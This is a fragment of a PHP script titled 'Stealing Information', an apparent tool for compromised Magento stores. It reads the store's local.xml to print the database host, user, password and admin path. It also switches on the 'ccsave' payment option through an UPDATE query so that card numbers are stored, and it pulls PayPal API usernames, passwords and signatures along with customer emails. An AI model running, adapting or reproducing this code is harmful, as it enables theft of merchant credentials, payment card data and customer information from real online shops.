...
<div align="center">Stealing Information<br> 
<div align="center">coder: alibaba<br> 
...
if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){ 
    ...
    if(isset($xml->global->resources->default_setup->connection)) { 
       ...
       $prefix = $xml->global->resources->db->table_prefix; 
		$args = $xml->admin->routers->adminhtml->args;
       ...
       echo $connection->host."|".$connection->username."|".$connection->password."|".$connection->dbname."| ".$args->frontName." | $key<br/>\n"; 
    ...
    echo "</table><br>"; 
    //========================================================================================================= 
    $query = mysql_query("UPDATE `core_config_data` SET value = '1' WHERE path = 'payment/ccsave/active';"); 
...
//    $query = mysql_query("SELECT email,value FROM customer_entity_varchar, customer_entity WHERE customer_entity_varchar.entity_id = customer_entity.entity_id and attribute_id=12"); 
    ...
    if(mysql_num_rows($query) != 0 || mysql_num_rows($query2) != 0 ){ 
        ...
        $query_smtp = mysql_query("SELECT (SELECT a.value FROM core_config_data as a WHERE path = 'paypal/general/business_account') as host , (SELECT b.value FROM core_config_data as b WHERE path = 'paypal/wpp/api_username') as port,(SELECT c.value FROM core_config_data as c WHERE path = 'paypal/wpp/api_password') as user ,(SELECT d.value FROM core_config_data as d WHERE path = 'paypal/wpp/api_signature') as pass FROM core_config_data limit 1,1"); 
